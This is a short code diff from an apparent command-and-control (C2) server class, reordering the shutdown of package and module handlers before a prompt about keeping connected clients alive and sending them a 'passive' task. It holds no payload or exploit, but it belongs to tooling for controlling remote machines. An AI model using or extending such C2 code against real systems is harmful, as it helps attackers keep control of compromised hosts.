@@ -307,9 +307,9 @@ class C2():
         Quit server and optionally keep clients alive
         
         """
+        globals()['package_handler'].terminate()
+        globals()['module_handler'].terminate()
         if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
-            globals()['package_handler'].terminate()
-            globals()['module_handler'].terminate()
             for session in self.sessions.values():
                 session._active.set()
                 session.send_task('passive')
